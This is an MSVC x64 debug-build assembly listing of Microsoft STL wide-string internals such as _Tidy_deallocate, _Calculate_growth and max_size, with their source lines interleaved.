; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 224
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first, COMDAT

; 1534 :     constexpr const _Ty1& _Get_first() const noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1535 :         return *this;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]

; 1536 :     }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 224
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first, COMDAT

; 1530 :     constexpr _Ty1& _Get_first() noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1531 :         return *this;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]

; 1532 :     }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 224
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal, COMDAT

; 4893 :     _CONSTEXPR20 const _Alty& _Getal() const noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4894 :         return _Mypair._Get_first();

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b c8	 mov	 rcx, rax
  00029	e8 00 00 00 00	 call	 ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first

; 4895 :     }

  0002e	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00035	5f		 pop	 rdi
  00036	5d		 pop	 rbp
  00037	c3		 ret	 0
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 224
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal, COMDAT

; 4889 :     _CONSTEXPR20 _Alty& _Getal() noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4890 :         return _Mypair._Get_first();

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b c8	 mov	 rcx, rax
  00029	e8 00 00 00 00	 call	 ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first

; 4891 :     }

  0002e	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00035	5f		 pop	 rdi
  00036	5d		 pop	 rbp
  00037	c3		 ret	 0
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z
_TEXT	SEGMENT
this$ = 224
_Right$ = 232
?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Swap_proxy_and_iterators, COMDAT

; 4885 :     _CONSTEXPR20 void _Swap_proxy_and_iterators(basic_string& _Right) noexcept {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4886 :         _Mypair._Myval2._Swap_proxy_and_iterators(_Right._Mypair._Myval2);

  00024	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  0002b	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00032	48 8b d0	 mov	 rdx, rax
  00035	e8 00 00 00 00	 call	 ?_Swap_proxy_and_iterators@_Container_base0@std@@QEAAXAEAU12@@Z ; std::_Container_base0::_Swap_proxy_and_iterators

; 4887 :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Swap_proxy_and_iterators
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
_TEXT	SEGMENT
_My_data$ = 8
_Al$1 = 40
$T2 = 260
this$ = 320
?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate, COMDAT

; 4863 :     _CONSTEXPR20 void _Tidy_deallocate() noexcept { // initialize buffer, deallocating any storage

$LN4:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 48 01
	00 00		 sub	 rsp, 328		; 00000148H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4864 :         auto& _My_data = _Mypair._Myval2;

  0001f	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 89 45 08	 mov	 QWORD PTR _My_data$[rbp], rax

; 4865 :         _My_data._Orphan_all();

  0002a	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  0002e	e8 00 00 00 00	 call	 ?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all

; 4866 :         if (_My_data._Large_mode_engaged()) {

  00033	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  00037	e8 00 00 00 00	 call	 ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
  0003c	0f b6 c0	 movzx	 eax, al
  0003f	85 c0		 test	 eax, eax
  00041	74 34		 je	 SHORT $LN2@Tidy_deall

; 4867 :             _ASAN_STRING_REMOVE(*this);
; 4868 :             auto& _Al = _Getal();

  00043	48 8b 8d 40 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0004a	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  0004f	48 89 45 28	 mov	 QWORD PTR _Al$1[rbp], rax

; 4869 :             _Deallocate_for_capacity(_Al, _My_data._Bx._Ptr, _My_data._Myres);

  00053	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  00057	4c 8b 40 18	 mov	 r8, QWORD PTR [rax+24]
  0005b	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0005f	48 8b 10	 mov	 rdx, QWORD PTR [rax]
  00062	48 8b 4d 28	 mov	 rcx, QWORD PTR _Al$1[rbp]
  00066	e8 00 00 00 00	 call	 ?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity

; 4870 :             _My_data._Bx._Switch_to_buf();

  0006b	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0006f	48 8b c8	 mov	 rcx, rax
  00072	e8 00 00 00 00	 call	 ?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf
$LN2@Tidy_deall:

; 4871 :         }
; 4872 : 
; 4873 :         _My_data._Mysize = 0;

  00077	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0007b	48 c7 40 10 00
	00 00 00	 mov	 QWORD PTR [rax+16], 0

; 4874 :         _My_data._Myres  = _Small_string_capacity;

  00083	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  00087	48 c7 40 18 07
	00 00 00	 mov	 QWORD PTR [rax+24], 7

; 4875 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4876 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  0008f	33 c0		 xor	 eax, eax
  00091	66 89 85 04 01
	00 00		 mov	 WORD PTR $T2[rbp], ax
  00098	b8 02 00 00 00	 mov	 eax, 2
  0009d	48 6b c0 00	 imul	 rax, rax, 0
  000a1	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  000a5	48 03 c8	 add	 rcx, rax
  000a8	48 8b c1	 mov	 rax, rcx
  000ab	48 8d 95 04 01
	00 00		 lea	 rdx, QWORD PTR $T2[rbp]
  000b2	48 8b c8	 mov	 rcx, rax
  000b5	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 4877 :     }

  000ba	48 8d a5 28 01
	00 00		 lea	 rsp, QWORD PTR [rbp+296]
  000c1	5f		 pop	 rdi
  000c2	5d		 pop	 rbp
  000c3	c3		 ret	 0
?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z
_TEXT	SEGMENT
this$ = 224
_Requested$ = 232
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth, COMDAT

; 4773 :     _NODISCARD _CONSTEXPR20 size_type _Calculate_growth(const size_type _Requested) const noexcept {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4774 :         return _Calculate_growth(_Requested, _Mypair._Myval2._Myres, max_size());

  00024	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0002b	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  00030	4c 8b c0	 mov	 r8, rax
  00033	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0003a	48 8b 50 18	 mov	 rdx, QWORD PTR [rax+24]
  0003e	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Requested$[rbp]
  00045	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth

; 4775 :     }

  0004a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00051	5f		 pop	 rdi
  00052	5d		 pop	 rbp
  00053	c3		 ret	 0
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z
_TEXT	SEGMENT
_Masked$ = 8
$T4 = 232
__$ArrayPad$ = 248
_Requested$ = 288
_Old$ = 296
_Max$ = 304
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth, COMDAT

; 4760 :         const size_type _Requested, const size_type _Old, const size_type _Max) noexcept {

$LN5:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00022	b9 12 00 00 00	 mov	 ecx, 18
  00027	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  0002c	f3 ab		 rep stosd
  0002e	48 8b 8c 24 48
	01 00 00	 mov	 rcx, QWORD PTR [rsp+328]
  00036	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0003d	48 33 c5	 xor	 rax, rbp
  00040	48 89 85 f8 00
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  00047	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0004e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4761 :         const size_type _Masked = _Requested | _Alloc_mask;

  00053	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR _Requested$[rbp]
  0005a	48 83 c8 07	 or	 rax, 7
  0005e	48 89 45 08	 mov	 QWORD PTR _Masked$[rbp], rax

; 4762 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

  00062	48 8b 85 30 01
	00 00		 mov	 rax, QWORD PTR _Max$[rbp]
  00069	48 39 45 08	 cmp	 QWORD PTR _Masked$[rbp], rax
  0006d	76 09		 jbe	 SHORT $LN2@Calculate_

; 4763 :             return _Max;

  0006f	48 8b 85 30 01
	00 00		 mov	 rax, QWORD PTR _Max$[rbp]
  00076	eb 68		 jmp	 SHORT $LN1@Calculate_
$LN2@Calculate_:

; 4764 :         }
; 4765 : 
; 4766 :         if (_Old > _Max - _Old / 2) { // similarly, geometric overflows

  00078	33 d2		 xor	 edx, edx
  0007a	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR _Old$[rbp]
  00081	b9 02 00 00 00	 mov	 ecx, 2
  00086	48 f7 f1	 div	 rcx
  00089	48 8b 8d 30 01
	00 00		 mov	 rcx, QWORD PTR _Max$[rbp]
  00090	48 2b c8	 sub	 rcx, rax
  00093	48 8b c1	 mov	 rax, rcx
  00096	48 39 85 28 01
	00 00		 cmp	 QWORD PTR _Old$[rbp], rax
  0009d	76 09		 jbe	 SHORT $LN3@Calculate_

; 4767 :             return _Max;

  0009f	48 8b 85 30 01
	00 00		 mov	 rax, QWORD PTR _Max$[rbp]
  000a6	eb 38		 jmp	 SHORT $LN1@Calculate_
$LN3@Calculate_:

; 4768 :         }
; 4769 : 
; 4770 :         return (_STD max)(_Masked, _Old + _Old / 2);

  000a8	33 d2		 xor	 edx, edx
  000aa	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR _Old$[rbp]
  000b1	b9 02 00 00 00	 mov	 ecx, 2
  000b6	48 f7 f1	 div	 rcx
  000b9	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR _Old$[rbp]
  000c0	48 03 c8	 add	 rcx, rax
  000c3	48 8b c1	 mov	 rax, rcx
  000c6	48 89 85 e8 00
	00 00		 mov	 QWORD PTR $T4[rbp], rax
  000cd	48 8d 95 e8 00
	00 00		 lea	 rdx, QWORD PTR $T4[rbp]
  000d4	48 8d 4d 08	 lea	 rcx, QWORD PTR _Masked$[rbp]
  000d8	e8 00 00 00 00	 call	 ??$max@_K@std@@YAAEB_KAEB_K0@Z ; std::max<unsigned __int64>
  000dd	48 8b 00	 mov	 rax, QWORD PTR [rax]
$LN1@Calculate_:

; 4771 :     }

  000e0	48 8b f8	 mov	 rdi, rax
  000e3	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  000e7	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcFrameData
  000ee	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  000f3	48 8b c7	 mov	 rax, rdi
  000f6	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  000fd	48 33 cd	 xor	 rcx, rbp
  00100	e8 00 00 00 00	 call	 __security_check_cookie
  00105	48 8d a5 08 01
	00 00		 lea	 rsp, QWORD PTR [rbp+264]
  0010c	5f		 pop	 rdi
  0010d	5d		 pop	 rbp
  0010e	c3		 ret	 0
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ
_TEXT	SEGMENT
_Alloc_max$ = 8
_Storage_max$ = 40
$T4 = 264
$T5 = 296
$T6 = 328
__$ArrayPad$ = 344
this$ = 384
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size, COMDAT

; 4165 :     _NODISCARD _CONSTEXPR20 size_type max_size() const noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 88 01
	00 00		 sub	 rsp, 392		; 00000188H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00018	b9 2a 00 00 00	 mov	 ecx, 42			; 0000002aH
  0001d	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00022	f3 ab		 rep stosd
  00024	48 8b 8c 24 a8
	01 00 00	 mov	 rcx, QWORD PTR [rsp+424]
  0002c	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00033	48 33 c5	 xor	 rax, rbp
  00036	48 89 85 58 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0003d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00044	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4166 :         const size_type _Alloc_max   = _Alty_traits::max_size(_Getal());

  00049	48 8b 8d 80 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00050	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00055	48 8b c8	 mov	 rcx, rax
  00058	e8 00 00 00 00	 call	 ?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
  0005d	48 89 45 08	 mov	 QWORD PTR _Alloc_max$[rbp], rax

; 4167 :         const size_type _Storage_max = // can always store small string

  00061	48 c7 85 08 01
	00 00 08 00 00
	00		 mov	 QWORD PTR $T4[rbp], 8
  0006c	48 8d 95 08 01
	00 00		 lea	 rdx, QWORD PTR $T4[rbp]
  00073	48 8d 4d 08	 lea	 rcx, QWORD PTR _Alloc_max$[rbp]
  00077	e8 00 00 00 00	 call	 ??$max@_K@std@@YAAEB_KAEB_K0@Z ; std::max<unsigned __int64>
  0007c	48 8b 00	 mov	 rax, QWORD PTR [rax]
  0007f	48 89 45 28	 mov	 QWORD PTR _Storage_max$[rbp], rax

; 4168 :             (_STD max)(_Alloc_max, static_cast<size_type>(_BUF_SIZE));
; 4169 :         return (_STD min)(static_cast<size_type>((numeric_limits<difference_type>::max)()),

  00083	48 8b 45 28	 mov	 rax, QWORD PTR _Storage_max$[rbp]
  00087	48 ff c8	 dec	 rax
  0008a	48 89 85 28 01
	00 00		 mov	 QWORD PTR $T5[rbp], rax
  00091	e8 00 00 00 00	 call	 ?max@?$numeric_limits@_J@std@@SA_JXZ ; std::numeric_limits<__int64>::max
  00096	48 89 85 48 01
	00 00		 mov	 QWORD PTR $T6[rbp], rax
  0009d	48 8d 95 28 01
	00 00		 lea	 rdx, QWORD PTR $T5[rbp]
  000a4	48 8d 8d 48 01
	00 00		 lea	 rcx, QWORD PTR $T6[rbp]
  000ab	e8 00 00 00 00	 call	 ??$min@_K@std@@YAAEB_KAEB_K0@Z ; std::min<unsigned __int64>
  000b0	48 8b 00	 mov	 rax, QWORD PTR [rax]

; 4170 :             _Storage_max - 1 // -1 is for null terminator and/or npos
; 4171 :         );
; 4172 :     }

  000b3	48 8b f8	 mov	 rdi, rax
  000b6	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  000ba	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcFrameData
  000c1	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  000c6	48 8b c7	 mov	 rax, rdi
  000c9	48 8b 8d 58 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  000d0	48 33 cd	 xor	 rcx, rbp
  000d3	e8 00 00 00 00	 call	 __security_check_cookie
  000d8	48 8d a5 68 01
	00 00		 lea	 rsp, QWORD PTR [rbp+360]
  000df	5f		 pop	 rdi
  000e0	5d		 pop	 rbp
  000e1	c3		 ret	 0
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
